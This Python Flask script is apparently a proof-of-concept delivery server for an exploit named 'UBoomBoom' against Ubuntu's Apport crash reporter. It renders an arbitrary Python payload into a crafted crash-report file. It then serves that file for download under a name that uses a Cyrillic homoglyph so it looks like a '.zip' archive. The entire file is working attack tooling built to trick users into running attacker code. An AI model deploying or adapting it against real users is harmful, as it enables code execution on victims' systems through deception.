#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse

from flask import Flask, abort, render_template, make_response
from jinja2 import Template

app = Flask(__name__, template_folder='.')

@app.route("/")
def index():
    """
    Serve the index page
    """
    return render_template("index.tmpl", payload_name=app.config["payload_name"])


@app.route(u"/<file_name>")
def payload(file_name):
    """
    Serve the exploit crash file.
    """
    if file_name == app.config["payload_name"]:
        response = make_response(app.config["exploit"])
        response.headers["Content-Type"] = "application/octet-stream"
        response.headers["Content-Disposition"] = "attachment; filename={}".format(
            file_name.encode('utf-8')
        )
        return response
    else:
        abort(404)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Serve the UBoomBoom Apport crash report exploit.")
    parser.add_argument("-c", "--crash-template", metavar="CRASH_REPORT_TEMPLATE", type=file,
                        help="Template containing the crash report (default '%(default)s').",
                        default="crash-report.tmpl",)

    parser.add_argument("-p", "--payload", metavar="PAYLOAD", type=file,
                        help="Python code for the payload (default '%(default)s').",
                        default="payload.py")

    parser.add_argument("-n", "--payload-name", metavar="EXPLOIT_FILENAME", type=str,
                        help="The name of the exploit file when served to the user "
                        "(default: '%(default)s') containing a p homoglyph.",
                        default="uboomboom.zi\xd1\x80")

    parser.add_argument("--port", type=int, default=8000,
                        help="Port for server to listen on (default '%(default)s')."),


    args = parser.parse_args()

    # Newlines are needed at the start and end to create a valid crash report format.
    python_payload = b"\n" + args.payload.read().strip() + b"\n\n"

    # Format the payload and create the exploit crash file from the template.
    crash_template = Template(args.crash_template.read())
    crash_exploit = crash_template.render(python_payload=python_payload)

    app.config["exploit"] = crash_exploit
    app.config["payload_name"] = args.payload_name.decode("utf-8")

    app.run(host="0.0.0.0", port=args.port, debug=True)
